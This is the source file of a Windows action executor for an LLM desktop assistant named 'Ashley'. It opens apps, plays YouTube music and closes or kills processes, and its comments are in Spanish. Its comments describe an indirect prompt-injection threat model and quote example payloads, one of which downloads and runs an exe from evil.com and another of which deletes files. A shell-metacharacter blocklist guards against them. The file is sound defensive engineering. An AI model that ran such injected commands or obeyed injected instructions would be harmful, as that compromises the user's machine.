"""
actions.py — Ejecutor de acciones del sistema para Ashley.

Dependencias:
  pip install pyautogui pyperclip pycaw comtypes pillow

  - pyautogui  → control de teclado / ratón
  - pyperclip  → portapapeles (para texto con acentos y caracteres especiales)
  - pycaw      → control preciso de volumen en Windows (opcional; fallback a PowerShell)
  - pillow     → screenshots
"""

import base64
import io
import os
import re
import subprocess
import time
import urllib.parse
import webbrowser
from typing import Optional


# ── Shell injection guards ───────────────────────────────────────────────────
#
# Modelo de amenaza: Ashley emite tags [action:open_app:X] y
# [action:close_window:X] desde el LLM. Si el LLM es engañado vía indirect
# prompt injection (web search, news scraping, OCR de imágenes pegadas) puede
# emitir un X con metacaracteres de shell — ej.
# "notepad & curl evil.com/r.exe -o %TEMP%\\r.exe & %TEMP%\\r.exe" — y como
# ese parámetro acaba en una f-string que pasa a cmd.exe/PowerShell con
# shell=True, ejecuta cualquier cosa.
#
# Mitigación: bloquear caracteres de control de shell ANTES de pasar el
# parámetro al subprocess. Defense-in-depth — el parser de Ashley ya filtra,
# el toggle ⚡ Actions exige opt-in del user, pero esta capa cierra la puerta
# en el punto exacto donde el daño ocurre.

# Caracteres BLOQUEADOS para parámetros que llegan al shell.
# - `&` `|` separadores en cmd y PowerShell
# - `;` separador en PowerShell
# - `<` `>` redirection
# - `` ` `` escape en PowerShell
# - `$` expansion de variable en PowerShell
# - `"` `'` escape de string (rompen las comillas de la f-string)
# - newline / CR — separadores de comando
# Permitidos: alfanuméricos, espacios, `_ - . , @ ( ) [ ] : / \` (suficiente
# para nombres de app, paths Windows incluyendo "Program Files (x86)").
_SHELL_DANGER_CHARS = set('&|;<>$`"\'\n\r')


def _is_shell_safe(value: str) -> bool:
    """True si `value` no contiene ningún metacarácter de shell.

    Usado antes de meter cualquier string controlado (parcialmente) por el
    LLM en una invocación con shell=True o en una f-string que se pasa a
    PowerShell/cmd.
    """
    if not isinstance(value, str):
        return False
    return not any(c in _SHELL_DANGER_CHARS for c in value)


# Regex más estricto para nombres de proceso (taskkill /IM, Stop-Process -Name).
# Los nombres de proceso reales son siempre `[A-Za-z0-9_.-]+` — si llega algo
# distinto, es ataque o garbage del LLM.
_PROC_NAME_RE = re.compile(r"^[A-Za-z0-9_.\-]+$")


def _is_valid_proc_name(name: str) -> bool:
    """True si `name` es un nombre de proceso plausible (sin caracteres raros)."""
    if not isinstance(name, str):
        return False
    return bool(name and _PROC_NAME_RE.match(name))


# ── Mapa de nombres de apps → ejecutables (Windows) ──────────────────────────

# Apps que son solo una URL web (sin instalación local)
URL_APPS: dict[str, str] = {
    "tiktok":       "https://www.tiktok.com",
    "youtube":      "https://www.youtube.com",
    "twitter":      "https://www.twitter.com",
    "x":            "https://www.x.com",
    "reddit":       "https://www.reddit.com",
    "gmail":        "https://mail.google.com",
    "instagram":    "https://www.instagram.com",
    "instagram.com": "https://www.instagram.com",
    "netflix":      "https://www.netflix.com",
    "twitch":       "https://www.twitch.tv",
    "chatgpt":      "https://chat.openai.com",
    "claude":       "https://claude.ai",
    "github":       "https://www.github.com",
    "google":       "https://www.google.com",
    "facebook":     "https://www.facebook.com",
    "pinterest":    "https://www.pinterest.com",
    "linkedin":     "https://www.linkedin.com",
}

APP_MAP: dict[str, str] = {
    # Sistema
    "notepad": "notepad.exe",
    "bloc de notas": "notepad.exe",
    "calculadora": "calc.exe",
    "calculator": "calc.exe",
    "paint": "mspaint.exe",
    "explorador": "explorer.exe",
    "explorer": "explorer.exe",
    "explorador de archivos": "explorer.exe",
    "administrador de tareas": "taskmgr.exe",
    "task manager": "taskmgr.exe",
    "cmd": "cmd.exe",
    "terminal": "cmd.exe",
    "powershell": "powershell.exe",
    "herramienta de recorte": "SnippingTool.exe",
    "snipping tool": "SnippingTool.exe",
    "configuracion": "ms-settings:",
    "settings": "ms-settings:",
    "panel de control": "control.exe",
    "control panel": "control.exe",
    # Navegadores
    "chrome": "chrome",
    "google chrome": "chrome",
    "firefox": "firefox",
    "edge": "msedge",
    "microsoft edge": "msedge",
    "brave": "brave",
    "opera": "opera",
    "opera gx": "opera",
    # Multimedia
    "spotify": "spotify",
    "vlc": "vlc",
    "windows media player": "wmplayer.exe",
    "media player": "wmplayer.exe",
    # Productividad Microsoft
    "word": "winword",
    "excel": "excel",
    "powerpoint": "powerpnt",
    "outlook": "outlook",
    "teams": "teams",
    "onenote": "onenote",
    # Dev
    "vscode": "code",
    "visual studio code": "code",
    "vs code": "code",
    "visual studio": "devenv",
    "git bash": "git-bash",
    "android studio": "studio64",
    "intellij": "idea64",
    "pycharm": "pycharm64",
    "webstorm": "webstorm64",
    "rider": "rider64",
    # Comunicación
    "discord": "discord",
    "telegram": "telegram",
    "whatsapp": "whatsapp",
    "slack": "slack",
    "zoom": "zoom",
    "skype": "skype",
    # Entretenimiento / gaming
    "steam": "steam://open/main",   # protocolo URI — funciona aunque no esté en PATH
    "epic games": "com.epicgames.launcher://",
    "epic": "com.epicgames.launcher://",
    "epic games launcher": "com.epicgames.launcher://",
    # Herramientas
    "obs": "obs64",
    "obs studio": "obs64",
    "figma": "figma",
    "notion": "notion",
    "obsidian": "obsidian",
    "postman": "postman",
    "docker": "docker desktop",
    "insomnia": "insomnia",
    "dbeaver": "dbeaver",
}

# Teclas con nombre legible para el diálogo de permisos
KEY_LABELS: dict[str, str] = {
    "enter": "Enter", "tab": "Tab", "space": "Espacio",
    "backspace": "Retroceso", "delete": "Suprimir", "escape": "Escape",
    "up": "↑", "down": "↓", "left": "←", "right": "→",
    "home": "Inicio", "end": "Fin", "pageup": "Re Pág", "pagedown": "Av Pág",
    "f1": "F1", "f2": "F2", "f3": "F3", "f4": "F4", "f5": "F5",
    "f6": "F6", "f7": "F7", "f8": "F8", "f9": "F9", "f10": "F10",
    "f11": "F11", "f12": "F12",
}


# ── Screenshot ────────────────────────────────────────────────────────────────

def take_screenshot() -> str:
    """Captura la pantalla completa. Devuelve base64 PNG (≤1920px de ancho)."""
    from PIL import ImageGrab
    img = ImageGrab.grab(all_screens=True)
    w, h = img.size
    if w > 1920:
        img = img.resize((1920, int(h * 1920 / w)))
    buf = io.BytesIO()
    img.save(buf, format="PNG", optimize=True)
    return base64.b64encode(buf.getvalue()).decode()


def take_screenshot_low_res() -> str:
    """Captura la pantalla a resolución media (1280px ancho, JPEG q=60).
    Suficiente para que el LLM lea títulos de ventanas y contenido general.
    640px era demasiado bajo — el LLM no podía leer texto y alucinaba.
    Tamaño típico: ~80-150KB en base64 (~2000-3000 tokens de imagen)."""
    from PIL import ImageGrab
    img = ImageGrab.grab(all_screens=True)
    w, h = img.size
    new_w = 1280
    new_h = int(h * new_w / w)
    img = img.resize((new_w, new_h))
    img = img.convert("RGB")
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=60, optimize=True)
    b64 = base64.b64encode(buf.getvalue()).decode()
    return f"data:image/jpeg;base64,{b64}"


# ── Alias de apps (abreviaturas comunes → nombre real) ───────────────────────

_APP_ALIASES: dict[str, list[str]] = {
    "lol": ["league of legends", "league"],
    "league": ["league of legends"],
    "valo": ["valorant"],
    "val": ["valorant"],
    "tft": ["teamfight tactics"],
    "ow": ["overwatch"],
    "overwatch": ["overwatch 2", "overwatch"],
    "wow": ["world of warcraft"],
    "mc": ["minecraft"],
    "genshin": ["genshin impact"],
    "apex": ["apex legends"],
    "csgo": ["counter-strike", "counter strike", "cs2"],
    "cs2": ["counter-strike", "counter strike"],
    "fortnite": ["fortnite", "epic games launcher"],
    "cod": ["call of duty"],
    "rl": ["rocket league"],
    "r6": ["rainbow six"],
    "dota": ["dota 2"],
    "poe": ["path of exile"],
    "gta": ["grand theft auto", "gta v", "gta5"],
    "hsr": ["honkai star rail", "honkai: star rail"],
}


# ── Abrir aplicación ──────────────────────────────────────────────────────────

# Tokens que marcan un shortcut como "NO lanzador principal" y deben
# descartarse aunque contengan el hint. "unins" cubre el naming de
# Inno Setup (unins000.exe). El resto es ruido típico de installers.
_SHORTCUT_REJECT_TOKENS = (
    "uninstall", "unins000", "unins001", "unins", "remove",
    "desinstalar", "désinstaller",
    "readme", "manual", "helper", "crash", "reporter",
    "redistributable", "config",
)


def score_shortcut_name(name: str, hint: str) -> int:
    """Puntúa cuánto matchea el nombre de un shortcut vs un hint.

    Devuelve entero: más alto = mejor match. 0 = no debe considerarse
    (descartado por token de rechazo, o no relacionado con el hint).

    Scoring:
      100  → nombre exacto = hint (ej. "rimworld.lnk" con hint="rimworld")
       80  → nombre empieza por hint (ej. "rimworld classic")
       60  → hint es substring del nombre (ej. "play rimworld now")
       30  → nombre es substring del hint (ej. name="rim", hint="rimworld")
        0  → rechazado o sin relación

    Expuesto como función pura para poder testear el ranking sin filesystem.
    """
    if not name or not hint:
        return 0
    name_l = name.lower()
    hint_l = hint.lower()

    # Descartar desinstaladores, readmes, crash reporters, etc.
    if any(tok in name_l for tok in _SHORTCUT_REJECT_TOKENS):
        return 0

    if name_l == hint_l:
        return 100
    if name_l.startswith(hint_l):
        return 80
    if hint_l in name_l:
        return 60
    if name_l in hint_l:
        return 30
    return 0


def _search_desktop(hint: str) -> str | None:
    """Busca shortcuts/exes en el escritorio del usuario que matcheen hint.

    El escritorio es una señal fuerte de intención: si el user puso algo
    ahí, es porque lo usa a menudo y quiere acceso rápido. Por eso lo
    chequeamos ANTES que el Menú Inicio en open_app.

    Cubre los tres layouts típicos de escritorio en Windows:
      - %USERPROFILE%\\Desktop        (perfil normal)
      - %USERPROFILE%\\OneDrive\\Desktop / Escritorio (con OneDrive sync)
      - %PUBLIC%\\Desktop              (shortcuts compartidos)

    Acepta .lnk (shortcuts, lo más común), .url (internet shortcuts,
    para favoritos web pegados al escritorio) y .exe (rara vez, pero
    algún user arrastra el ejecutable crudo). El ranking usa el mismo
    score_shortcut_name que Start Menu, así que los desinstaladores y
    helpers se descartan automáticamente.
    """
    import glob
    username = os.getenv("USERNAME", "")
    public = os.getenv("PUBLIC", r"C:\Users\Public")
    search_roots = [
        rf"C:\Users\{username}\Desktop",
        rf"C:\Users\{username}\OneDrive\Desktop",
        rf"C:\Users\{username}\OneDrive\Escritorio",  # Windows en español con OneDrive
        rf"C:\Users\{username}\OneDrive\Bureau",       # Windows en francés
        rf"{public}\Desktop",
    ]

    candidates: list[tuple[int, int, str]] = []
    for root in search_roots:
        if not os.path.isdir(root):
            continue
        for pattern in ("*.lnk", "*.url", "*.exe"):
            for f in glob.iglob(os.path.join(root, pattern)):
                name = os.path.splitext(os.path.basename(f))[0]
                score = score_shortcut_name(name, hint)
                if score > 0:
                    candidates.append((-score, len(name), f))

    if not candidates:
        return None
    candidates.sort()
    return candidates[0][2]


def _search_start_menu(hint: str) -> str | None:
    """Busca un acceso directo (.lnk) en el menú de inicio que matchee el
    hint. Devuelve la ruta completa al .lnk, None si no hay match.

    IMPORTANTE — ranking: antes devolvíamos el PRIMER match, que causaba
    que "rimworld" abriera "Uninstall RimWorld.lnk" porque glob lo
    devolvía antes que "RimWorld.lnk". Ahora puntuamos todos los matches
    vía score_shortcut_name y elegimos el mejor. Ante empate, el nombre
    más corto gana (suele ser el launcher principal).
    """
    import glob
    username = os.getenv("USERNAME", "")
    search_roots = [
        rf"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs",
        r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs",
    ]

    candidates: list[tuple[int, int, str]] = []  # (-score, len_tiebreak, path)
    for root in search_roots:
        for lnk in glob.iglob(os.path.join(root, "**", "*.lnk"), recursive=True):
            name = os.path.splitext(os.path.basename(lnk))[0]
            score = score_shortcut_name(name, hint)
            if score > 0:
                candidates.append((-score, len(name), lnk))

    if not candidates:
        return None
    # Orden natural: menor tupla primero → mayor score + menor len
    candidates.sort()
    return candidates[0][2]


def _open_msg(lang: str, kind: str, **kw) -> str:
    """Mensajes localizados para open_app.
    kind: 'launched' | 'web' | 'proto_fail' | 'not_found'"""
    is_en = (lang == "en")
    if kind == "launched":
        if is_en:
            return f"Launched '{kw['name']}'. Its window may take a few seconds to appear — trust this confirmation."
        return f"Lanzado '{kw['name']}'. Su ventana puede tardar unos segundos en aparecer — confía en esta confirmación."
    if kind == "web":
        if is_en:
            return f"Opened '{kw['name']}' in the browser."
        return f"'{kw['name']}' abierto en el navegador."
    if kind == "proto_fail":
        if is_en:
            return f"Couldn't open '{kw['name']}' (protocol {kw['exe']}): {kw['err']}"
        return f"No pude abrir '{kw['name']}' (protocolo {kw['exe']}): {kw['err']}"
    # not_found fallback
    if is_en:
        return f"Couldn't find '{kw['name']}'. Searched direct launch, PowerShell, Start Menu and common install folders. Last error: {kw.get('err','?')}"
    return f"No pude encontrar '{kw['name']}'. Probé lanzamiento directo, PowerShell, Menú Inicio y carpetas comunes. Último error: {kw.get('err','?')}"


def open_app(app_name: str, lang: str = "en") -> str:
    key = app_name.lower().strip()

    # 1. Apps que son solo una URL web
    if key in URL_APPS:
        webbrowser.open(URL_APPS[key])
        return _open_msg(lang, "web", name=app_name)

    exe = APP_MAP.get(key, key)

    # 2. Protocolos URI (steam://, ms-settings:, com.epicgames...) → os.startfile
    if "://" in exe or exe.endswith(":"):
        try:
            os.startfile(exe)
            return _open_msg(lang, "launched", name=app_name)
        except Exception as e:
            return _open_msg(lang, "proto_fail", name=app_name, exe=exe, err=e)

    # 3. Intentar directamente con os.startfile (busca en registro de Windows)
    try:
        os.startfile(exe)
        return _open_msg(lang, "launched", name=app_name)
    except Exception:
        pass

    # 4. PowerShell Start-Process — busca en PATH, App Paths del registro y UWP
    # Solo si `exe` no contiene metacaracteres de shell. Si llega algo como
    # `notepad" ; Remove-Item ...` desde el LLM (indirect prompt injection),
    # saltamos este path y pasamos al siguiente. Los caches y APP_MAP solo
    # contienen nombres limpios, así que la rama segura cubre el 100% de uso
    # legítimo.
    if _is_shell_safe(exe):
        try:
            ps = f'Start-Process "{exe}" -ErrorAction Stop'
            result = subprocess.run(
                ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-c", ps],
                capture_output=True, text=True, timeout=8,
            )
            if result.returncode == 0:
                return _open_msg(lang, "launched", name=app_name)
        except Exception:
            pass

    # 5. Buscar en el ESCRITORIO del usuario.
    # Ir aquí ANTES del Menú Inicio es intencional: si el user tiene un
    # shortcut en el escritorio, significa que lo usa a menudo (curación
    # manual >>> carpeta automática del installer). Además, muchos usan
    # el escritorio como su "launcher" personal con cosas que ni siquiera
    # tienen entrada en el Menú Inicio.
    search_terms = [key, exe, app_name]
    # Expandir alias (ej. "lol" → "league of legends")
    for alias_term in _APP_ALIASES.get(key, []):
        if alias_term not in search_terms:
            search_terms.append(alias_term)
    for search_term in search_terms:
        shortcut = _search_desktop(search_term)
        if shortcut:
            try:
                os.startfile(shortcut)
                return _open_msg(lang, "launched", name=app_name)
            except Exception:
                pass

    # 6. Buscar acceso directo en menú de inicio (cubre apps como LoL, Riot, etc.)
    for search_term in search_terms:
        lnk = _search_start_menu(search_term)
        if lnk:
            try:
                os.startfile(lnk)
                return _open_msg(lang, "launched", name=app_name)
            except Exception:
                pass

    # 7. Buscar el .exe en rutas comunes de instalación
    username = os.getenv("USERNAME", "")
    common_roots = [
        r"C:\Program Files",
        r"C:\Program Files (x86)",
        rf"C:\Users\{username}\AppData\Local",
        rf"C:\Users\{username}\AppData\Roaming",
        rf"C:\Users\{username}\AppData\Local\Programs",
        r"C:\Riot Games",
    ]
    exe_name = exe if exe.endswith(".exe") else exe + ".exe"
    for root in common_roots:
        if not os.path.isdir(root):
            continue
        for folder_name in [app_name, exe, key]:
            candidate = os.path.join(root, folder_name, exe_name)
            if os.path.exists(candidate):
                try:
                    subprocess.Popen([candidate])
                    return _open_msg(lang, "launched", name=app_name)
                except Exception:
                    pass

    # 8. Eliminado el fallback `subprocess.Popen(exe, shell=True)` — era
    # vector de inyección si `exe` venía contaminado por indirect prompt
    # injection (LLM engañado vía web/news scrape). Tras 7 intentos
    # (URL_APPS, protocolos URI, os.startfile directo, PowerShell
    # Start-Process, escritorio, menú inicio, rutas comunes) si nada
    # encontró el .exe, un último shell-pass con metacaracteres no aporta
    # nada legítimo — solo riesgo. Mejor un error claro.
    return _open_msg(lang, "not_found", name=app_name, err="not on disk")


# ── Música ────────────────────────────────────────────────────────────────────

def _resolve_youtube_url(query: str) -> tuple[str, str]:
    """
    Obtiene la URL directa del primer video de YouTube para query.
    Devuelve (video_url, title). Lanza excepción si falla.
    """
    import re
    import requests

    search_url = "https://www.youtube.com/results?search_query=" + urllib.parse.quote(query)
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept-Language": "es-ES,es;q=0.9",
    }
    resp = requests.get(search_url, headers=headers, timeout=8)
    resp.raise_for_status()

    video_id_match = re.search(r'"videoId":"([a-zA-Z0-9_-]{11})"', resp.text)
    if not video_id_match:
        raise ValueError("No se encontró ningún videoId")

    video_id  = video_id_match.group(1)
    video_url = f"https://www.youtube.com/watch?v={video_id}"

    title_match = re.search(
        r'"videoId":"' + re.escape(video_id) + r'".*?"title":\{"runs":\[\{"text":"([^"]+)"',
        resp.text,
    )
    if not title_match:
        title_match = re.search(r'"title":\{"runs":\[\{"text":"([^"]+)"', resp.text)
    title = title_match.group(1) if title_match else query

    return video_url, title


def _find_browser_exe() -> str | None:
    """Encuentra el ejecutable del navegador por defecto desde el registro de Windows."""
    try:
        import winreg
        import re as _re
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice",
        ) as key:
            prog_id = winreg.QueryValueEx(key, "ProgId")[0]
        with winreg.OpenKey(
            winreg.HKEY_CLASSES_ROOT,
            f"{prog_id}\\shell\\open\\command",
        ) as key:
            cmd = winreg.QueryValueEx(key, "")[0]
        m = _re.match(r'"([^"]+)"', cmd)
        if m and os.path.exists(m.group(1)):
            return m.group(1)
    except Exception:
        pass
    return None


def _close_window_by_hwnd(hwnd: int) -> bool:
    """Envía WM_CLOSE a una ventana y espera a que se cierre."""
    import ctypes
    user32 = ctypes.windll.user32
    if not hwnd or not user32.IsWindow(hwnd):
        return True
    user32.PostMessageW(hwnd, 0x0010, 0, 0)  # WM_CLOSE
    for _ in range(10):
        time.sleep(0.2)
        if not user32.IsWindow(hwnd):
            return True
    return False


def play_music(query: str, browser_already_open: bool = False,
                prefer_cdp: bool = False) -> tuple[str, bool, bool]:
    """
    Busca el primer video en YouTube y lo reproduce.

    MODO HÍBRIDO (v0.13.25):
      • Si prefer_cdp=True AND CDP disponible → usa CDP para abrir tab nueva.
        Bonus: cierra la tab anterior de YouTube si existía (evita acumulación
        que pasa con webbrowser.open). Sub-100ms, sin foco visible.
      • Si CDP no disponible / prefer_cdp=False → cae a webbrowser.open
        (path legacy que delega al shell handler de Windows).
    - Si ya hay una pestaña de YouTube que Ashley abrió antes → NAVEGA a la nueva URL
      en esa misma pestaña (no abre otra ni cierra nada del usuario).
    - Si no hay pestaña previa → abre una nueva pestaña (NO ventana nueva).
    NUNCA cierra ventanas/pestañas del usuario. Solo reutiliza las que Ashley abrió.

    Devuelve (mensaje, browser_opened, success).
      - success=True  → la canción se reprodujo (o navegamos su pestaña)
      - success=False → falló: el navegador no abrió ninguna pestaña visible
                        para la nueva URL. El caller debe propagar success=False
                        a execute_action para que Ashley genere disculpa en
                        personaje en lugar de afirmar éxito falsamente.

    Caso ambiguo (MSAA no responde) → success=True con disclaimer en el
    mensaje pidiéndole a Ashley que pregunte al jefe si lo ve.

    v0.13.24 introdujo verificación más estricta del título. v0.13.25 (este
    cambio) propaga el success real al execute_action layer — antes
    siempre devolvía True aunque el mensaje fuera 'Error: ...', así que
    Ashley nunca disparaba la disculpa post-fallo.
    """
    global _youtube_hwnd
    import logging
    log = logging.getLogger("ashley.music")

    try:
        video_url, title = _resolve_youtube_url(query)
    except Exception as e:
        log.warning(f"play_music: resolve failed: {e}")
        video_url = "https://www.youtube.com/results?search_query=" + urllib.parse.quote(query)
        title = query

    log.warning(f"play_music: query={query!r} hwnd={_youtube_hwnd} url={video_url}")

    # ── Path CDP (modo moderno opt-in) ───────────────────────────────────
    if prefer_cdp:
        from . import browser_cdp as _cdp
        if _cdp.is_cdp_available():
            try:
                # Bonus del path CDP: cerrar la(s) tab(s) anterior(es) de
                # YouTube antes de abrir la nueva. Esto evita la acumulación
                # de tabs que pasa con webbrowser.open. Atomico: si falla la
                # nueva, las anteriores ya están cerradas — caemos al fallback
                # que abrirá una nueva limpia.
                old_yt = _cdp.find_tabs_matching("youtube")
                for t in old_yt:
                    _cdp.close_tab(t["id"])
                log.warning(f"play_music: CDP path — closed {len(old_yt)} old YouTube tab(s)")

                new_t = _cdp.new_tab(video_url)
                if new_t and new_t.get("id"):
                    log.warning(f"play_music: CDP path — opened tab id={new_t['id']}")
                    return f"Reproduciendo: '{title}'", True, True
                log.warning("play_music: CDP path — new_tab returned None, falling back")
            except Exception as _e:
                log.warning(f"play_music: CDP path failed ({_e}), falling back to webbrowser.open")

    # Snapshot PRE-acción: cuántas pestañas hay en navegadores antes de actuar.
    # Usamos este conteo para verificar que la pestaña realmente se abrió.
    def _count_tabs_fresh() -> tuple[int, list[str]]:
        try:
            _tabs_cache["ts"] = 0.0  # forzar lectura fresca
            tabs = _get_browser_tabs_via_uia(_get_all_browser_hwnds())
            return len(tabs), tabs
        except Exception:
            return -1, []

    pre_count, pre_tabs = _count_tabs_fresh()
    log.warning(f"play_music: pre-action tab count={pre_count}")

    # v0.13.25: SIMPLIFICACIÓN. Antes intentábamos ser "smart" con un
    # subprocess que enfocaba el browser y simulaba Ctrl+L → URL → Enter
    # para reusar la tab de YouTube anterior. Funciona en algunos browsers
    # pero Opera (y posiblemente otros browsers Chromium con anti-input
    # protections) BLOQUEA los SendInput sintéticos — el SetForegroundWindow
    # y el cycling parecen funcionar pero las teclas Ctrl+L nunca llegan
    # al browser y la URL no se navega. Resultado: badge "Reproduciendo" pero
    # la canción nueva no carga.
    #
    # Test empírico (sesión debug 2026-04-27 con el user reporting bug):
    #   - webbrowser.open con URL de test → tab nueva apareció ✓
    #   - subprocess SendInput Ctrl+L → la tab activa NO cambió de URL ✗
    #
    # Decisión: SIEMPRE webbrowser.open. Trade-off: tabs viejas de YouTube
    # se acumulan si el user pide "pon otra" varias veces. Mitigación: el
    # user puede pedir "cierra YouTube" → close_tab los limpia. Es worse
    # que el ideal "cambia la canción in-place" pero confiable.
    log.warning("play_music: opening URL via webbrowser.open (system shell handler)")
    webbrowser.open(video_url)

    # Capturar HWND (para futuras referencias / close_tab)
    captured = _capture_browser_hwnd(wait=2.0)
    if captured:
        _youtube_hwnd = captured
    log.warning(f"play_music: captured hwnd={_youtube_hwnd}")

    # ── VERIFICACIÓN post-acción ────────────────────────────────────────
    # Esperar a que el browser procese + UIA refleje el cambio. Aumentado
    # a 2.0s desde 1.0s — algunos browsers (Opera notably) tardan más en
    # responder al shell handler especialmente si estaban minimizados.
    time.sleep(2.0)
    post_count, post_tabs = _count_tabs_fresh()
    log.warning(f"play_music: post-action tab count={post_count}")
    # Sin subprocess de navegación, navigated siempre False — el flow
    # de verificación bajo solo aplica el caso 1 (count subió) o el
    # caso de error.
    navigated = False

    # Caso 1: conteo aumentó → nueva pestaña abierta, éxito.
    if pre_count >= 0 and post_count > pre_count:
        return f"Reproduciendo: '{title}'", True, True

    # Caso 2: conteo igual pero navegamos una pestaña existente. Buscar un
    # título que contenga PALABRAS DEL QUERY entre las pestañas.
    # v0.13.24: antes el match era too lax — bastaba con que cualquier tab
    # tuviera 'youtube' en el título para reportar success, aunque la
    # navegación de la nueva URL hubiera fallado (focus loss). Ahora
    # requerimos match con palabras del query nuevo: si el title de
    # alguna tab contiene una palabra significativa de la canción
    # solicitada, asumimos que la navegación tomó efecto. Si no →
    # caer a 'navigation no tomó' y reportar honesto.
    if navigated and post_count >= 0:
        q_lower = query.lower()
        q_words = [w for w in q_lower.split() if len(w) > 3]
        if q_words:
            for t in post_tabs:
                t_lower = t.lower()
                if any(w in t_lower for w in q_words):
                    return f"Reproduciendo: '{title}'", True, True
            log.warning(
                f"play_music: navigated=True but NO tab matches query "
                f"words {q_words} — navigation likely silently failed"
            )
        else:
            # Query sin palabras significativas — fallback al check viejo
            for t in post_tabs:
                if "youtube" in t.lower():
                    return f"Reproduciendo: '{title}'", True, True

    # Caso 3: no podemos verificar que la pestaña apareció. Ser honesto:
    # MSAA no responde → no sabemos si fue éxito. Antes devolvíamos
    # "Reproduciendo..." asumiendo éxito — eso hacía que Ashley mintiera.
    # Ahora devolvemos un mensaje AMBIGUO para que Ashley NO afirme en
    # pasado que lo hizo, y pregunte al jefe si lo ve.
    # success=True para evitar disparar disculpa en personaje en este
    # caso (es ambiguo, no fallo claro).
    if post_count < 0 or pre_count < 0:
        log.warning("play_music: MSAA verification unavailable (ambiguous result)")
        return (
            f"Lanzado el enlace de '{title}' al navegador. NO HE PODIDO VERIFICAR "
            f"si la pestaña realmente se abrió (MSAA/UIA no responde). Informa al "
            f"jefe con honestidad: 'lo mandé al navegador pero no estoy segura si "
            f"lo abrió — ¿lo ves en pantalla?'. NO afirmes que está reproduciendo."
        ), True, True

    # Caso 4: fallo claro — pre y post conocidos pero el conteo no aumentó.
    # success=False dispara que Ashley genere disculpa en personaje vía
    # _stream_action_failure_apology. Mensaje del badge corto + amigable
    # (los detalles técnicos van al log para debug).
    log.warning(
        f"play_music: VERIFICATION FAILED — pre={pre_count} post={post_count} "
        f"query={query!r} title={title!r}"
    )
    return (
        f"No se pudo abrir '{title}' en el navegador."
    ), False, False


# ── Búsqueda web ──────────────────────────────────────────────────────────────

def search_web(query: str) -> str:
    url = "https://www.google.com/search?q=" + urllib.parse.quote(query)
    webbrowser.open(url)
    return f"Búsqueda de '{query}' abierta en Google."


# ── Abrir URL ─────────────────────────────────────────────────────────────────

def open_url(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    webbrowser.open(url)
    return f"URL abierta: {url}"


# ── Cerrar ventana / app ──────────────────────────────────────────────────────

def _find_window_title(hint: str) -> str | None:
    """Devuelve el título exacto de la primera ventana que contenga hint."""
    # Hint puede venir del LLM via tags. Bloqueamos metacaracteres antes de
    # interpolar a la f-string que pasa a PowerShell. Si trae caracteres
    # peligrosos (`"`, `&`, `;`, `$`...), abortamos y devolvemos None.
    if not _is_shell_safe(hint):
        return None
    ps = (
        f'Get-Process | Where-Object {{ $_.MainWindowTitle -like "*{hint}*" }}'
        f' | Select-Object -First 1 -ExpandProperty MainWindowTitle'
    )
    result = subprocess.run(
        ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-c", ps],
        capture_output=True, text=True, timeout=5,
    )
    title = result.stdout.strip()
    return title if title else None


def _terminate_process_by_name(proc_name: str) -> bool:
    """
    Mata un proceso por nombre usando SeDebugPrivilege + TerminateProcess vía ctypes.
    Funciona contra procesos elevados si el usuario tiene cuenta de administrador.
    Devuelve True si mató al menos un proceso.
    """
    import ctypes
    from ctypes import wintypes

    kernel32  = ctypes.windll.kernel32
    advapi32  = ctypes.windll.advapi32

    # ── Intentar habilitar SeDebugPrivilege ──────────────────────────────────
    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_QUERY             = 0x0008
    SE_PRIVILEGE_ENABLED    = 0x00000002

    class LUID(ctypes.Structure):
        _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

    class LUID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

    class TOKEN_PRIVILEGES(ctypes.Structure):
        _fields_ = [("PrivilegeCount", wintypes.DWORD),
                    ("Privileges", LUID_AND_ATTRIBUTES * 1)]

    htoken = wintypes.HANDLE()
    if advapi32.OpenProcessToken(
            kernel32.GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            ctypes.byref(htoken)):
        luid = LUID()
        if advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid)):
            tp = TOKEN_PRIVILEGES()
            tp.PrivilegeCount = 1
            tp.Privileges[0].Luid = luid
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
            advapi32.AdjustTokenPrivileges(
                htoken, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None)
        kernel32.CloseHandle(htoken)

    # ── Snapshot de procesos y TerminateProcess ──────────────────────────────
    TH32CS_SNAPPROCESS = 0x00000002
    PROCESS_TERMINATE  = 0x0001

    class PROCESSENTRY32W(ctypes.Structure):
        _fields_ = [
            ("dwSize",             wintypes.DWORD),
            ("cntUsage",           wintypes.DWORD),
            ("th32ProcessID",      wintypes.DWORD),
            ("th32DefaultHeapID",  ctypes.POINTER(wintypes.ULONG)),
            ("th32ModuleID",       wintypes.DWORD),
            ("cntThreads",         wintypes.DWORD),
            ("th32ParentProcessID", wintypes.DWORD),
            ("pcPriClassBase",     wintypes.LONG),
            ("dwFlags",            wintypes.DWORD),
            ("szExeFile",          ctypes.c_wchar * 260),
        ]

    target = proc_name.lower().replace(".exe", "")
    killed = False

    hsnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if hsnap == wintypes.HANDLE(-1).value:
        return False
    try:
        pe = PROCESSENTRY32W()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32W)
        more = kernel32.Process32FirstW(hsnap, ctypes.byref(pe))
        while more:
            exe = pe.szExeFile.lower().replace(".exe", "")
            if target == exe or target in exe:
                hproc = kernel32.OpenProcess(PROCESS_TERMINATE, False, pe.th32ProcessID)
                if hproc:
                    kernel32.TerminateProcess(hproc, 1)
